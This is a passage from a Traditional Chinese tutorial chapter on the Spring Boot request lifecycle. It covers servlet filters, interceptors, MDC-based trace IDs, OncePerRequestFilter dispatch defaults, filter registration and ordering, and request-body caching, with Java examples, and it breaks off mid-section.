# 第 04 章：請求生命週期 — Filter、Interceptor 與橫切關注點

> 前三章的程式碼裡有一個欄位一直是假的：**`traceId`**。
>
> `ProblemFactory` 寫著 `MDC.get("traceId")`，但**到現在還沒有任何程式碼把它放進去**。
> 這一章要補上它，以及所有「不屬於任何單一端點，但每個端點都需要」的東西：
> 追蹤 ID、請求日誌、分頁硬上限、冪等鍵、參數注入。
>
> 這些東西的共同特徵是：**如果你在 83 個端點裡各寫一次，就會有 83 份不一致的實作。**
> 這一章要教的是把它們放進**正確的攔截層**，而「正確」有很具體的判準。

---

## 4.1 學習目標

完成本章後，你應該可以：

- 說出 Filter、Interceptor、`HandlerMethodArgumentResolver`、AOP、`ResponseBodyAdvice` 各自**能做什麼、不能做什麼**，並用決策流程選出正確的機制。
- 說明 `OncePerRequestFilter` 為什麼存在，以及它在 `ASYNC` / `ERROR` dispatch 上的預設行為。
- 說出 Spring Boot 內建六個 filter 的 order 值，並決定你的 filter 該插在哪裡。
- **從零實作一個生產級的 `TraceIdFilter`**：接受上游 ID、防 log injection、寫回 header、在 `finally` 清 MDC。
- 說明 MDC 與 `ThreadLocal`、虛擬執行緒、非同步請求的交互作用，以及三種傳遞方式。
- 判斷該用自己的 traceId 還是 Micrometer Tracing，並知道兩者怎麼共存。
- **區分 `ContentCachingRequestWrapper` 與「可重複讀的 body」**，並知道為什麼前者不足以做冪等。
- 設計請求日誌：記什麼、怎麼遮蔽、怎麼取樣、為什麼要結構化。
- 在參數綁定「之前」驗證原始查詢參數，讓 `?size=99999` 回 422 而不是靜默夾取。
- **實作冪等鍵**，並處理它的三個競態條件。
- 寫自訂 `HandlerMethodArgumentResolver`，把 `Actor` / `RequestContext` 注入方法參數。
- 說出非同步請求（`Callable`、`DeferredResult`、`SseEmitter`）的生命週期差異，以及它破壞了哪些假設。

---

## 4.2 先看見痛：一個查不到的錯誤

### 4.2.1 星期二早上 09:47

客服轉來一張工單：

> 「客戶說他昨天下午下單失敗，畫面顯示『系統暫時發生問題』。
> 他的訂單有沒有成立？錢有沒有扣？」

**你手上的資訊**：
- 「昨天下午」
- 客戶說他叫「王先生」

**你的系統的日誌**：

```
2026-08-19 14:03:12.441 [http-nio-8080-exec-17] ERROR c.e.s.o.w.OrderController - 系統錯誤
java.lang.NullPointerException: Cannot invoke "...getCustomer()" because ...
	at example.shop.order.service.OrderServiceImpl.create(OrderServiceImpl.java:88)
	... 40 more lines ...
2026-08-19 14:03:12.512 [http-nio-8080-exec-3] ERROR c.e.s.o.w.OrderController - 系統錯誤
java.lang.NullPointerException: ...
2026-08-19 14:07:55.103 [http-nio-8080-exec-22] ERROR c.e.s.o.w.OrderController - 系統錯誤
...（那個下午總共 214 筆）
```

**214 筆一模一樣的錯誤。哪一筆是王先生的？**

你只能：

| 步驟 | 耗時 |
|---|---|
| 1. 從客戶資料表找出所有姓王的客戶（317 個） | 10 分鐘 |
| 2. 問客服要客戶的電話後四碼 → 縮小到 4 個 | 25 分鐘（等客服回覆） |
| 3. 查這 4 個客戶昨天的訂單紀錄 | 15 分鐘 |
| 4. 發現有一筆 `PENDING_PAYMENT` 的孤兒訂單 | — |
| 5. 但無法確定那是不是他那次失敗留下的 | — |
| 6. 查金流商後台對帳，確認沒有扣款 | 40 分鐘 |
| 7. 回覆客服 | — |
| **合計** | **約 1.5 小時** |

**而如果有 traceId：**

| 步驟 | 耗時 |
|---|---|
| 1. 客服問：「畫面下方有沒有一組 8 位英數字？」客戶：「4f2c8a1e」 | 30 秒 |
| 2. Loki 搜 `traceId=4f2c8a1e*` | 3 秒 |
| 3. 看到整條鏈路：哪個客戶、哪些商品、哪一行拋 NPE、有沒有進金流 | 1 分鐘 |
| **合計** | **約 2 分鐘** |

**45 倍的差距。** 而實作成本是一個 60 行的 Filter。

### 4.2.2 更貴的情況：分散式系統

如果訂單服務會呼叫金流服務、庫存服務、通知服務，**沒有 traceId 的除錯是不可能的**：

```
order-service   14:03:12  ERROR  呼叫 payment-service 失敗
payment-service 14:03:12  ERROR  呼叫 gateway 逾時
gateway-adapter 14:03:11  WARN   連線池耗盡
inventory-svc   14:03:12  ERROR  鎖等待逾時
```

**四條 log，四個服務，同一秒。它們是同一個請求嗎？**
沒有 traceId 的話，你只能猜。而在每秒 200 個請求的系統上，那一秒有 200 個候選。

### 4.2.3 第二個痛：靜默夾取的匯出

真實事故（03-rest-api 第 05 章 5.2.4 提過，這裡看實作面）：

營運要匯出「上個月所有訂單」做報表，總共 41 萬筆。

```
GET /orders?createdFrom=2026-07-01&createdTo=2026-08-01&size=1000000
```

**Spring Data 的 `PageableHandlerMethodArgumentResolver` 的行為**：

```java
// spring.data.web.pageable.max-page-size = 100
size = Math.min(requestedSize, maxPageSize);      // 1000000 → 100
```

**靜默夾取。回 HTTP 200，回 100 筆。**

營運拿到 100 筆，以為上個月只有 100 筆訂單，做了一份少了 41 萬筆的報表交給老闆。

⚠️ **沒有任何錯誤訊息、沒有 warning log、沒有告警。**

**修法不是「把 max-page-size 調大」**（那會讓一個請求撈 100 萬筆進記憶體），
而是**在參數綁定之前檢查原始值，超限就回 422**（4.8 節）。

### 4.2.4 第三個痛：重複扣款

使用者在結帳頁按了「確認付款」，網路慢，他等了 8 秒沒反應，又按了一次。

```
14:03:12.100  POST /orders/ord_1/payments   → 開始處理
14:03:20.340  POST /orders/ord_1/payments   → 開始處理（第二次）
14:03:22.891  第一個請求完成 → 扣款 1280.50
14:03:24.102  第二個請求完成 → 扣款 1280.50     ← 重複！
```

**兩筆扣款、一張訂單。** 客戶投訴、財務要退款、客服要處理。

而如果有冪等鍵（4.9 節）：

```
14:03:12.100  POST + Idempotency-Key: idem-abc123  → 建立紀錄，開始處理
14:03:20.340  POST + Idempotency-Key: idem-abc123  → 偵測到重複
                                                   → 回 409 PAYMENT_ALREADY_IN_PROGRESS
                                                     + statusCheckUrl
14:03:22.891  第一個請求完成 → 扣款一次
```

**前端拿到 409 + `statusCheckUrl` → 開始輪詢 → 顯示「處理中」→ 3 秒後顯示成功。**
使用者甚至不知道自己按了兩次。

### 4.2.5 這三個痛的共同點

| 痛 | 如果寫在 Controller 裡 |
|---|---|
| traceId | 83 個方法各寫一次；漏掉的端點就查不到；而 404 / 401 根本沒進 Controller |
| 分頁上限 | 每個列表端點各寫一次；新端點忘了寫就沒防護 |
| 冪等鍵 | 每個寫入端點各寫一次；而它需要包裝 request/response，Controller 做不到 |

**它們都是「橫切關注點」（cross-cutting concern）**：
不屬於任何單一端點，但每個（或一類）端點都需要。

**這一章就是在教「橫切關注點該放在哪一層」。**

---

## 4.3 五種橫切機制

### 4.3.1 完整能力對照表 ★

這是第 00 章 0.8.2 的展開版，也是本章最該記住的一張表。

| 能力 | Filter | Interceptor | ArgumentResolver | `ResponseBodyAdvice` | AOP `@Around` |
|---|---|---|---|---|---|
| **規格層級** | Servlet | Spring MVC | Spring MVC | Spring MVC | Spring AOP |
| **執行位置** | `DispatcherServlet` 外 | `doDispatch()` 內 | 參數解析階段 | 回傳值處理階段 | 方法呼叫時 |
| 拿到原始 `HttpServletRequest` | ✅ | ✅ | ✅ | ⚠️ 只有 `ServerHttpRequest` | ❌ 需注入 |
| **能包裝 request / response** | ✅ **唯一** | ❌ | ❌ | ❌ | ❌ |
| 能讓 body 可重複讀 | ✅ **唯一** | ❌ | — | — | ❌ |
| 知道要打哪個 Controller 方法 | ❌ | ✅ | ✅ | ✅ | ✅ |
| 讀得到方法上的註解 | ❌ | ✅ | ✅ | ✅ | ✅ |
| 拿得到**已綁定、已驗證**的參數 | ❌ | ❌ | ⚠️ 它負責產生 | ❌ | ✅ |
| **能改回傳值** | ⚠️ 需包裝 response | ❌ | — | ✅ **最適合** | ✅ |
| 能終止請求 | ✅ 不呼叫 `chain.doFilter` | ✅ `preHandle` 回 `false` | ✅ 拋例外 | ❌ | ✅ 拋例外 |
| **拋的例外會進 advice** | ❌ **不會** | ✅ 會 | ✅ 會 | ✅ 會 | ✅ 會 |
| 對非 Controller 請求生效（靜態檔、`/actuator`） | ✅ | ⚠️ 看 path pattern | ❌ | ❌ | ❌ |
| 對 404 / 405 生效 | ✅ | ❌（找不到 handler 就不會呼叫） | ❌ | ❌ | ❌ |
| 對被 Security 攔掉的請求生效 | ⚠️ 看 order | ❌ | ❌ | ❌ | ❌ |
| 保證一定執行清理 | ✅ `finally` | ✅ `afterCompletion` | ❌ | ❌ | ✅ `finally` |
| 能作用在 Service 層 | ❌ | ❌ | ❌ | ❌ | ✅ **唯一** |
| 效能成本 | 極低 | 極低 | 極低 | 低 | ⚠️ 需 proxy |

**五個「唯一」值得單獨記住：**

1. **只有 Filter 能包裝 request / response** → 想讓 body 可重複讀、想改回應 bytes，只能用 Filter。
2. **只有 Filter 對 404 / 401 生效** → traceId 必須是 Filter（否則查不到「打錯路徑」的請求）。
3. **只有 `ResponseBodyAdvice` 能乾淨地改「已序列化前的回傳物件」** → 統一包裝層、欄位過濾。
4. **只有 AOP 能作用在 Service 層** → 交易、快取、重試、方法層權限。
5. **Filter 拋的例外不會進 advice** → 這是選擇 Filter 的最大代價（3.10.1 的 `ProblemWriter` 就是為它而存在）。

### 4.3.2 決策流程

```
我要做的事……
   │
   ├─ 需要作用在 Service / Repository 的方法上？
   │     └─ YES → AOP（@Around / @Transactional / @Cacheable）
   │
   ├─ 需要「包裝」request 或 response（讓 body 可重複讀、改回應 bytes）？
   │     └─ YES → Filter
   │
   ├─ 需要對「所有」請求生效，包含 404、401、靜態資源？
   │     └─ YES → Filter
   │
   ├─ 需要在 Security 之「前」執行（例如 traceId 要涵蓋認證失敗）？
   │     └─ YES → Filter（order < -100）
   │
   ├─ 需要讀 Controller 方法上的註解來決定行為？
   │     ├─ 而且要在方法執行「前」擋掉 → Interceptor.preHandle
   │     └─ 而且要修改「回傳值」        → ResponseBodyAdvice
   │
   ├─ 需要把某個東西變成「方法參數」？
   │     └─ YES → HandlerMethodArgumentResolver
   │
   └─ 需要在請求結束時「一定」執行清理？
         ├─ 涵蓋所有請求 → Filter 的 finally
         └─ 只涵蓋 Controller → Interceptor.afterCompletion
```

### 4.3.3 shop-service 的十個橫切需求與選擇

| # | 需求 | 選擇 | 決定性理由 |
|---|---|---|---|
| 1 | traceId 放進 MDC 與回應 header | **Filter**（order -121） | 要涵蓋 404 / 401 / 被 Security 擋掉的請求 |
| 2 | 尾斜線 308 重導（01 章 1.3.5） | **Filter**（order -120） | 要在路由比對之前 |
| 3 | request body 大小上限（02 章 2.11.2） | **Filter**（order -118） | 要包裝 `InputStream` |
| 4 | 讓 body 可重複讀（給冪等與日誌用） | **Filter**（order -117） | 只有 Filter 能包裝 |
| 5 | 請求 / 回應日誌 | **Filter**（order -116） | 要讀 body、要記錄「沒進 Controller」的請求 |
| 6 | 分頁參數硬上限 | **Interceptor** | 要在 `Pageable` / `OrderFilter` 綁定「之前」，但只針對 Controller |
| 7 | 未知查詢參數偵測（01 章 1.7.5） | **Interceptor** | 需要讀 handler method 的參數清單 |
| 8 | 冪等鍵 | **Filter + Interceptor 混合** | 需要包裝（Filter）+ 讀 `@Idempotent` 註解（Interceptor） |
| 9 | 注入 `Actor` / `RequestContext` | **ArgumentResolver** | 它就是「把東西變成方法參數」 |
| 10 | Service 方法的耗時統計 | **AOP** | 只有 AOP 能作用在 Service 層 |

⚠️ **注意第 8 項是混合的。** 這在實務上很常見 ——
單一機制做不到的事，用兩個機制分工。4.9 節會完整實作。

---

## 4.4 Filter 深入

### 4.4.1 `OncePerRequestFilter` 為什麼存在

**Servlet 的 filter 可能在同一個 HTTP 請求裡被執行多次。** 三種情況：

```
① forward / include（RequestDispatcher）
   請求進來 → filter 執行 → servlet A → request.getRequestDispatcher("/b").forward(...)
                                        → filter 再執行一次 → servlet B

② ERROR dispatch
   請求進來 → filter 執行 → 拋例外 → 容器 forward 到 /error
                                    → filter 再執行一次

③ ASYNC dispatch
   請求進來 → filter 執行 → Controller 回 Callable → 請求「暫停」
   背景執行緒完成 → 容器發起 ASYNC dispatch → filter 可能再執行一次
```

> ### ⚠️ 但先講清楚：**這三種情況預設有幾種會真的發生？**
>
> filter 只在「它註冊的 dispatcher types」上被呼叫，而 Boot 的預設是：
>
> ```java
> // AbstractFilterRegistrationBean
> private EnumSet<DispatcherType> dispatcherTypes;   // null = 用容器預設
> // → 沒設定時，Boot 傳 null 給 servletContext.addFilter(...).addMappingForUrlPatterns(null, ...)
> // → Servlet 規格：null 等同於 EnumSet.of(DispatcherType.REQUEST)
> ```
>
> **而 Boot 的 `OrderedRequestContextFilter`、`OrderedCharacterEncodingFilter`
> 等內建 filter 明確設成 `REQUEST + ASYNC + ERROR`**：
>
> ```java
> // OrderedRequestContextFilter / AbstractFilterRegistrationBean.determineDispatcherTypes()
> // Boot 的 FilterRegistrationBean 若沒指定，實際套用的是
> EnumSet.of(DispatcherType.REQUEST, DispatcherType.ASYNC, DispatcherType.ERROR)
> ```
>
> ⚠️ **兩條路徑的預設不一樣，這是最容易混淆的地方**：
>
> | 註冊方式 | 預設 dispatcher types | 所以會不會重複執行 |
> |---|---|---|
> | `@Component` + `@Order`（Boot 自動包成 `FilterRegistrationBean`） | **REQUEST + ASYNC + ERROR** | ✅ ASYNC 與 ERROR 都會 |
> | 自己寫 `FilterRegistrationBean` 但**不呼叫** `setDispatcherTypes()` | 同上（Boot 的預設，**不是**容器的 `REQUEST`） | ✅ 同上 |
> | `@WebFilter(dispatcherTypes = ...)` | 註解上寫什麼就是什麼，預設 `REQUEST` | 依設定 |
> | **`forward` / `include`（情況 ①）** | **預設不包含 `FORWARD`/`INCLUDE`** | 🔴 **預設不會發生** |
>
> **所以對 shop-service（純 REST API、沒有 view、沒有 forward）而言**：
>
> - 情況 ①（forward / include）：**預設不會發生**。
>   ⚠️ 但 `sendError()` 造成的 `/error` 是 **ERROR dispatch**（不是 forward），所以…
> - 情況 ②（ERROR dispatch）：**會發生** —— 而且是最容易咬人的那一個。
> - 情況 ③（ASYNC dispatch）：**會發生** —— 05 章的串流與 SSE 全部走這條。
>
> **`OncePerRequestFilter` 的預設值正好對應這件事**：
> `shouldNotFilterAsyncDispatch()` 與 `shouldNotFilterErrorDispatch()
> **都預設 `true`**（跳過），因為那是「絕大多數 filter 想要的行為」。

**為什麼這是問題？** 用 traceId 舉例：

```java
// ❌ 沒有防重複
public class NaiveTraceFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) {
        String traceId = UUID.randomUUID().toString();      // ← 每次執行都產生新的
        MDC.put("traceId", traceId);
        try { chain.doFilter(req, res); }
        finally { MDC.remove("traceId"); }
    }
}
```

發生 500 時：

```
① REQUEST dispatch:  traceId = aaaa  → Controller 拋例外 → 記 log（traceId=aaaa）
                                      → finally 清掉 MDC
② ERROR dispatch:    traceId = bbbb  → /error 產生回應（traceId=bbbb）
```

**回應給客戶端的 traceId 是 `bbbb`，但 log 裡的是 `aaaa`。**
客戶提供 `bbbb`，你什麼都查不到。

**`OncePerRequestFilter` 的解法**：用一個 request attribute 記錄「我已經執行過了」。

```java
// Spring 的實作（簡化）
public abstract class OncePerRequestFilter extends GenericFilterBean {

    public static final String ALREADY_FILTERED_SUFFIX = ".FILTERED";

    @Override
    public final void doFilter(ServletRequest request, ServletResponse response,
                               FilterChain chain) throws ServletException, IOException {
        String alreadyFilteredAttributeName = getAlreadyFilteredAttributeName();
        boolean hasAlreadyFiltered = request.getAttribute(alreadyFilteredAttributeName) != null;

        if (skipDispatch(httpRequest) || shouldNotFilter(httpRequest)) {
            chain.doFilter(request, response);              // 跳過，直接往下
        }
        else if (hasAlreadyFiltered) {
            chain.doFilter(request, response);              // 已執行過，跳過
        }
        else {
            request.setAttribute(alreadyFilteredAttributeName, Boolean.TRUE);
            try {
                doFilterInternal(httpRequest, httpResponse, chain);    // ★ 你的邏輯
            } finally {
                request.removeAttribute(alreadyFilteredAttributeName);
            }
        }
    }
}
```

**兩個可覆寫的預設行為** ★：

```java
/** 預設 true：ASYNC dispatch 時「不」執行 doFilterInternal。 */
protected boolean shouldNotFilterAsyncDispatch() { return true; }

/** 預設 true：ERROR dispatch 時「不」執行 doFilterInternal。 */
protected boolean shouldNotFilterErrorDispatch() { return true; }
```

⚠️ **`shouldNotFilterAsyncDispatch()` 預設 `true` 造成一個重要後果**：

```
① REQUEST dispatch（http-nio-exec-7）
   TraceIdFilter 執行 → MDC.put("traceId", "aaaa")
   Controller 回傳 SseEmitter → 請求進入非同步模式
   TraceIdFilter 的 finally 執行 → MDC.remove("traceId")     ← ⚠️ MDC 被清掉了！

② 背景執行緒（task-1）寫 SSE 事件
   MDC 是空的 → log 沒有 traceId

③ ASYNC dispatch（http-nio-exec-12）
   TraceIdFilter 因為 shouldNotFilterAsyncDispatch()=true 而跳過
   → MDC 仍然是空的
```

**所以非同步端點的 log 沒有 traceId。** 4.5.7 會處理這件事。

⚠️ **`getAlreadyFilteredAttributeName()` 預設用「filter 名稱 + `.FILTERED`」**。
如果你註冊了同一個 filter 類別的兩個實例但沒給不同名稱，
第二個會被當成「已執行過」而跳過。

### 4.4.2 三種註冊方式

**方式 A：`@Component`（最簡單）**

```java
@Component
@Order(-121)
public class TraceIdFilter extends OncePerRequestFilter { }
```

| 優點 | 缺點 |
|---|---|
| 一行搞定 | ⚠️ **無法設定 URL pattern** —— 一律套用到 `/*` |
| 可以注入其他 bean | ⚠️ 無法設定 dispatcher types |

⚠️ **「無法設定 URL pattern」的處理方式是覆寫 `shouldNotFilter()`**（4.4.5）。

**方式 B：`FilterRegistrationBean`（最靈活）**

```java
@Configuration
public class FilterConfig {

    @Bean
    FilterRegistrationBean<TraceIdFilter> traceIdFilter(TraceIdFilter filter) {
        var registration = new FilterRegistrationBean<>(filter);
        registration.setName("traceIdFilter");
        registration.addUrlPatterns("/*");
        registration.setOrder(-121);
        // ★ 明確宣告要在哪些 dispatch 型別上執行
        registration.setDispatcherTypes(
                DispatcherType.REQUEST, DispatcherType.ASYNC, DispatcherType.ERROR);
        return registration;
    }
}
```

> ### ⚠️ 「同時是 `@Component` 會被註冊兩次」是一個**流傳很廣但錯誤**的說法 ★
>
> Boot 的 `ServletContextInitializerBeans` 會先收集所有
> `FilterRegistrationBean`，把**被包住的那個 filter 實例**放進一個 `seen` 集合；
> 之後掃描裸 `Filter` bean 時，凡是在 `seen` 裡的就跳過：
>
> ```java
> // ServletContextInitializerBeans（節錄、簡化）
> private void addServletContextInitializerBeans(ListableBeanFactory beanFactory) {
>     for (Class<? extends ServletContextInitializer> initializerType : this.initializerTypes) {
>         for (Entry<String, ? extends ServletContextInitializer> initializerBean :
>                 getOrderedBeansOfType(beanFactory, initializerType)) {
>             addServletContextInitializerBean(initializerBean.getKey(), initializerBean.getValue(), beanFactory);
>         }
>     }
> }
>
> private void addServletContextInitializerBean(String name, ServletContextInitializer initializer, ...) {
>     if (initializer instanceof FilterRegistrationBean<?> registration) {
>         Filter source = registration.getFilter();
>         addServletContextInitializerBean(Filter.class, name, initializer, beanFactory, source);
>         //                                                                          ↑↑↑↑↑↑
>     }
>     ...
> }
>
> private void addServletContextInitializerBean(Class<?> type, String beanName, ..., Object source) {
>     this.initializers.add(type, initializer);
>     if (source != null) {
>         this.seen.add(source);        // ★★ 被包住的 filter 實例進 seen
>     }
> }
>
> // 之後掃裸 Filter bean 時
> private <T> void addAsRegistrationBean(...) {
>     for (Entry<String, T> entry : getOrderedBeansOfType(beanFactory, beanType, this.seen)) {
>         //                                                            ↑↑↑↑↑↑↑↑↑ 排除清單
>         ...
>     }
> }
> ```
>
> **所以 `@Component` + `FilterRegistrationBean<>(filter)` 只會註冊一次。**
>
> ⚠️⚠️ **但有一種情況真的會註冊兩次** ——
> `FilterRegistrationBean` 包的**不是同一個實例**：
>
> ```java
> // 🔴 這樣才會真的註冊兩次
> @Component
> public class TraceIdFilter extends OncePerRequestFilter { }
>
> @Bean
> FilterRegistrationBean<TraceIdFilter> traceIdFilter(TraceProperties props) {
>     // ★ new 出一個【新的】實例 → @Component 的那個不在 seen 裡 → 兩個都被註冊
>     return new FilterRegistrationBean<>(new TraceIdFilter(props));
> }
> ```
>
> **症狀**：`OncePerRequestFilter` 的 `getAlreadyFilteredAttributeName()`
> 預設用 `getFilterName() + ".FILTERED"`，而兩個實例的 filter name **不同**
> （一個是 `traceIdFilter`、一個是 Boot 自動產生的），
> 所以「已執行過」的檢查**攔不住** → `doFilterInternal` **真的跑兩次**
> → 兩個 traceId、兩份請求日誌。
>
> **shop-service 的規則（避免整件事）**：
>
> | 需要 | 做法 |
> |---|---|
> | 只要 order（不需要 URL pattern / dispatcher types） | `@Component` + `@Order`，**不要**再寫 `FilterRegistrationBean` |
> | 需要 URL pattern 或 dispatcher types | **只**寫 `FilterRegistrationBean`，filter 類別**不標** `@Component` |
> | 已經有 `@Component` 又想加設定 | `FilterRegistrationBean<>(existingBean)` —— **注入**那個 bean，不要 `new` |
>
> **而 06 章 6.9.4 的 `FilterOrderUniquenessTest` 順便守住這件事** ——
> 註冊兩次的話，同一個 order 會出現兩個 filter。

**方式 C：`@WebFilter` + `@ServletComponentScan`**

```java
@WebFilter(urlPatterns = "/*")
public class TraceIdFilter extends OncePerRequestFilter { }
```

❌ **不要用。** 它是 Servlet 3.0 的註解，**無法注入 Spring bean**
（因為它由 Servlet 容器管理，不是 Spring 容器），而且無法設定 order。

**shop-service 的規則**：
- 不需要 URL pattern → 方式 A（`@Component` + `@Order` + 覆寫 `shouldNotFilter`）。
- 需要精確控制 dispatcher types（例如 traceId 要涵蓋 ASYNC）→ 方式 B。

### 4.4.3 Spring Boot 內建 filter 的 order

**以 Spring Boot 3.2 為例**（⚠️ 這些值是實作細節，可能隨版本改變）：

| order | Filter | 來自 | 作用 |
|---|---|---|---|
| `Integer.MIN_VALUE`<br>(`HIGHEST_PRECEDENCE`) | `ForwardedHeaderFilter` | `WebMvcAutoConfiguration`（需 `server.forward-headers-strategy=framework`） | 處理 `X-Forwarded-*`（01 章 1.11.4） |
| `Integer.MIN_VALUE` | `OrderedCharacterEncodingFilter` | `HttpEncodingAutoConfiguration` | 設定 request 編碼 |
| `MIN_VALUE + 1` | `ServerHttpObservationFilter` | `WebMvcObservationAutoConfiguration` | Micrometer 的 metrics / tracing |
| `-10000` | `OrderedHiddenHttpMethodFilter` | `WebMvcAutoConfiguration` | ⚠️ Boot 3 **預設關閉** |
| `-9900` | `OrderedFormContentFilter` | `WebMvcAutoConfiguration` | 讓 `PUT`/`PATCH` 也能讀 form 參數 |
| `-105` | `OrderedRequestContextFilter` | `WebMvcAutoConfiguration` | 把 request 放進 `RequestContextHolder` |
| **`-100`** | `springSecurityFilterChain` | `SecurityFilterAutoConfiguration`<br>(`SecurityProperties.DEFAULT_FILTER_ORDER`) | **認證、授權、CORS 預檢** |
| `LOWEST_PRECEDENCE` | 你沒設 order 的 `@Component` filter | — | ⚠️ 在 Security **之後** |

**怎麼確認你的版本的實際值**（第 00 章 0.12.3 的程式碼）：

```java
@Bean
ApplicationRunner printFilters(ApplicationContext ctx) {
    return args -> {
        System.out.println("=== 已註冊的 Filter（依 order 排序）===");
        ctx.getBeansOfType(jakarta.servlet.Filter.class).entrySet().stream()
           .map(e -> {
               int order = (e.getValue() instanceof org.springframework.core.Ordered o)
                       ? o.getOrder() : Integer.MAX_VALUE;
               return java.util.Map.entry(order, e.getKey() + " → "
                       + e.getValue().getClass().getName());
           })
           .sorted(java.util.Map.Entry.comparingByKey())
           .forEach(e -> System.out.printf("%12d  %s%n", e.getKey(), e.getValue()));
    };
}
```

⚠️ **這段程式碼只印出「是 Spring bean 的 filter」**。
用 `FilterRegistrationBean` 註冊的要另外看：

```java
@Bean
ApplicationRunner printFilterRegistrations(ApplicationContext ctx) {
    return args -> ctx.getBeansOfType(
            org.springframework.boot.web.servlet.FilterRegistrationBean.class)
        .forEach((name, reg) -> System.out.printf("%12d  %s → %s%n",
                reg.getOrder(), name, reg.getFilter().getClass().getSimpleName()));
}
```

### 4.4.4 你的 filter 該插在哪裡 ★

**關鍵分界線是 Security 的 `-100`。**

| 你的 filter 需要…… | order | 例子 |
|---|---|---|
| 涵蓋**所有**請求，包含認證失敗的 | **< -100** | traceId、請求日誌、大小限制 |
| 知道「誰在操作」（已認證） | **> -100** | 依使用者取樣的日誌、per-user 限流 |
| 在路由比對之前改路徑 | < -100 | 尾斜線重導 |

**shop-service 的 filter 順序**：

```
-2147483648  ForwardedHeaderFilter          （Boot 內建）
-2147483648  CharacterEncodingFilter        （Boot 內建）
-2147483647  ServerHttpObservationFilter    （Boot 內建，metrics）
      -121   TraceIdFilter                  ★ 最早的自訂 filter
      -120   TrailingSlashRedirectFilter    （01 章 1.3.5）
      -118   RequestSizeLimitFilter         （02 章 2.11.2）
      -117   CachedBodyFilter               （4.4.6，讓 body 可重複讀）
      -116   RequestLoggingFilter           （4.6）
      -105   RequestContextFilter           （Boot 內建）
      -100   springSecurityFilterChain      （認證、授權、CORS）
       -99   IdempotencyFilter              （4.9，需要知道 Actor）
      -9900  FormContentFilter              （Boot 內建）⚠️ 見下方
```

⚠️ **`FormContentFilter` 的 order 是 `-9900`，比 `-121` 更小（更早）。**
所以它其實在你的 filter **之前**執行。

**這造成一個實際問題**：`FormContentFilter` 會**讀取 request body**
（為了把 form 參數變成 `getParameter()` 可讀），
所以如果請求是 `application/x-www-form-urlencoded`，
你的 `CachedBodyFilter`（order -117）拿到的 body 已經是空的。

**shop-service 不受影響**（全部用 JSON），但要知道這件事。
如果需要支援 form，`CachedBodyFilter` 必須在 `-9900` 之前。

**為什麼 traceId 選 `-121` 而不是 `Integer.MIN_VALUE`？**

因為 `ServerHttpObservationFilter`（Micrometer）在 `MIN_VALUE + 1`，
它會建立 observation 並可能設定 tracing 的 traceId。
**我們希望在它之後執行**，這樣才能讀到它產生的 traceId（4.5.5）。

⚠️ **但 `ForwardedHeaderFilter` 必須在最前面**，否則 `X-Forwarded-*` 還沒被處理，
你的 filter 拿到的 `request.getRequestURL()` 會是內部位址。

### 4.4.5 `shouldNotFilter`：不要對所有請求做所有事

```java
@Override
protected boolean shouldNotFilter(HttpServletRequest request) {
    String path = request.getRequestURI();
    return path.startsWith("/actuator")
        || path.startsWith("/swagger-ui")
        || path.startsWith("/v3/api-docs")
        || path.equals("/favicon.ico");
}
```

**為什麼要排除 `/actuator`？**

| 端點 | 頻率 | 排除的理由 |
|---|---|---|
| `/actuator/health` | Kubernetes liveness/readiness probe，**每 5 秒一次** | 每天 17,280 次。記日誌是純浪費 |
| `/actuator/prometheus` | Prometheus scrape，每 15 秒一次 | 同上，而且回應很大 |

**不排除的話**：日誌裡 90% 是健康檢查，真正的請求被淹沒。

⚠️ **但 traceId 不要排除 `/actuator`。**
因為健康檢查失敗時你會想知道是哪一次。
**只有「請求日誌」需要排除它們。**

**更精細的做法：把排除清單做成設定。**

```java
package example.shop.common.config;

import org.springframework.boot.context.properties.ConfigurationProperties;

import java.util.List;

@ConfigurationProperties(prefix = "api.filters")
public record FilterProperties(
    List<String> logExcludePatterns,
    List<String> traceExcludePatterns,
    int cachedBodyMaxBytes
) {
    // ⚠️ 這一版把「排除路徑」放在 FilterProperties，
    //    但 4.6.6 的 RequestLoggingProperties 也有一份 → 冗餘。
    //    4.13.6 會把它收攏（排除路徑統一由 RequestLoggingProperties 管）。
    public FilterProperties {
        logExcludePatterns = (logExcludePatterns == null)
                ? List.of("/actuator/**", "/swagger-ui/**", "/v3/api-docs/**", "/favicon.ico")
                : List.copyOf(logExcludePatterns);
        traceExcludePatterns = (traceExcludePatterns == null)
                ? List.of()                              // ★ traceId 不排除任何路徑
                : List.copyOf(traceExcludePatterns);
        if (cachedBodyMaxBytes <= 0) cachedBodyMaxBytes = 256 * 1024;   // 256 KB
    }
}
```

```java
private final org.springframework.util.AntPathMatcher matcher = new AntPathMatcher();

@Override
protected boolean shouldNotFilter(HttpServletRequest request) {
    String path = request.getRequestURI();
    return properties.logExcludePatterns().stream()
            .anyMatch(pattern -> matcher.match(pattern, path));
}
```

⚠️ **`AntPathMatcher` 每次比對都要解析 pattern。** 對 filter 這種每個請求都跑的地方，
建議預先編譯成 `PathPattern`：

```java
private final List<org.springframework.web.util.pattern.PathPattern> excludePatterns;

public RequestLoggingFilter(FilterProperties properties) {
    var parser = org.springframework.web.util.pattern.PathPatternParser.defaultInstance;
    this.excludePatterns = properties.logExcludePatterns().stream()
            .map(parser::parse)
            .toList();
}

@Override
protected boolean shouldNotFilter(HttpServletRequest request) {
    var path = org.springframework.http.server.PathContainer.parsePath(
            request.getRequestURI());
    return excludePatterns.stream().anyMatch(p -> p.matches(path));
}
```

⚠️ 這個優化在每秒幾百個請求時差異不大（`AntPathMatcher` 約 1 μs），
但在每秒上萬時會有感。**先用簡單版，量到瓶頸再優化。**

### 4.4.6 讓 body 可重複讀 ★

**這一節是本章最有價值的技術細節之一。**

#### 問題

HTTP request body 是一個**串流**（`InputStream`），只能讀一次。

```java
// Filter 裡
String body = new String(request.getInputStream().readAllBytes());     // 讀完了
chain.doFilter(request, response);
// → Controller 的 @RequestBody 拿到空的 body → 400 "Required request body is missing"
```

**兩種需求都需要「重複讀」**：
- **請求日誌**：想記下 body。
- **冪等鍵**：想算 body 的指紋（4.9）。

#### `ContentCachingRequestWrapper` 的真相 ★

Spring 提供 `ContentCachingRequestWrapper`，很多教材說它能解決這個問題。
**但它的語意常被誤解。**

```java
public class ContentCachingRequestWrapper extends HttpServletRequestWrapper {
    private final ByteArrayOutputStream cachedContent;
    // getInputStream() 回傳一個「邊讀邊記錄到 cachedContent」的 stream
    // getContentAsByteArray() 回傳「目前為止已經被讀掉的內容」
}
```

**它做的是「記錄已被讀取的內容」，不是「讓 body 可重複讀」。**

```java
